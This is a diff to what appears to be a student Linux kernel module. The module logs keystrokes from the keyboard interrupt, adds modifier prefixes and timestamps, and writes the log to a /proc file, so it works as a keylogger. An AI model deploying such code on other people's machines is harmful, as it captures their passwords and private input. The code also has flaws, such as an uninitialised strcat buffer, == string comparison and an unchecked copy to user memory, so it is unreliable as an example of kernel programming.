@@ -1,4 +1,20 @@
 /* starter code from http://bootloader.wikidot.com/linux:kernel:ldd:intrpt*/
+/*
+ * intrpt.c - An interrupt handler.
+ *
+ * Copyright (C) 2001 by Peter Jay Salzman
+ */
+ 
+/*
+ * The necessary header files
+ */
+ 
+/*
+ * Standard in kernel modules
+ */
+
+/***Modified by ALAN CLEETUS***/
+/***Last Modified on 12/06/2019***/
 
 #include <linux/kernel.h>       /* We're doing kernel work */
 #include <linux/module.h>       /* Specifically, a module */
@@ -12,6 +28,7 @@
 #include <linux/slab.h>
 #include <linux/time.h>
 #include <asm/uaccess.h>
+
 
 #define MY_WORK_QUEUE_NAME "WQsched.c"
 #define BUFFER_SIZE 120 	//buffer will never hold more that 80 characters but for insurance make the size 120
@@ -142,47 +159,49 @@ static void got_char(struct work_struct *work)
 
 			char* key = ((capslock && !shift_flag)||(!capslock && shift_flag)) ? upper_case_key_map[x][y]: lower_case_key_map[x][y];
 			
-			//genereate string for logging
-			char final_string[30];
-			
-			if(alt_flag)	strcat(final_string, "ALT+");
-			if(ctrl_flag)	strcat(final_string, "CTRL+");
-			
-			strcat(final_string, key);
-	
-			//calculate buff size
-			size_t curr = strlen(log_buffer)+strlen(final_string);
-	
-			// if buff size is more than 80 characters of the enter key is pressed then update proc file and reset byffer		
-			if(curr>80 || key=="\n")
-			{
-				//get current time and date
-				struct timeval tv;
-				struct tm my_tm;
+			if(key !=""){
+				//genereate string for logging
+				char final_string[30];
+				
+				if(alt_flag)	strcat(final_string, "ALT+");
+				if(ctrl_flag)	strcat(final_string, "CTRL+");
+				
+				strcat(final_string, key);
+		
+				//calculate buff size
+				size_t curr = strlen(log_buffer)+strlen(final_string);
+		
+				// if buff size is more than 80 characters of the enter key is pressed then update proc file and reset byffer		
+				if(curr>80 || key=="\n")
+				{
+					//get current time and date
+					struct timeval tv;
+					struct tm my_tm;
 
-				do_gettimeofday(&tv); 
+					do_gettimeofday(&tv); 
 
-				time_to_tm(tv.tv_sec, 0, &my_tm);
-				
-				sprintf(output, "%02d-%02d-%04ld %02d:%02d:%02d %s\n",
-				my_tm.tm_mon+1,
-				my_tm.tm_mday,  
-				my_tm.tm_year+1900,
-				my_tm.tm_hour, 
-				my_tm.tm_min, 
-				my_tm.tm_sec,
-				log_buffer
-				); 
-				
-				//reset log_buffer
-				memset(log_buffer, 0, sizeof(log_buffer));
-				
-				//printk(KERN_INFO "Outputting: %s",output);
-				
-			}else
-			{
-				strcat(log_buffer, final_string);
-				printk(KERN_INFO "Log Buffer: %s",log_buffer);
+					time_to_tm(tv.tv_sec, 0, &my_tm);
+					
+					sprintf(output, "%02d-%02d-%04ld %02d:%02d:%02d %s\n",
+					my_tm.tm_mon+1,
+					my_tm.tm_mday,  
+					my_tm.tm_year+1900,
+					my_tm.tm_hour, 
+					my_tm.tm_min, 
+					my_tm.tm_sec,
+					log_buffer
+					); 
+					
+					//reset log_buffer
+					memset(log_buffer, 0, sizeof(log_buffer));
+					
+					//printk(KERN_INFO "Outputting: %s",output);
+					
+				}else
+				{
+					strcat(log_buffer, final_string);
+					//printk(KERN_INFO "Log Buffer: %s",log_buffer);
+				}
 			}
 		}
   }
@@ -201,7 +220,7 @@ static ssize_t proc_read(struct file *fp, char *buf, size_t len, loff_t * off)
 {	static int finished=0; if(finished) {finished=0;return 0;} finished=1;
     
  	strcpy(buf, output);
-
+	
 	return strlen(buf);
 }
 
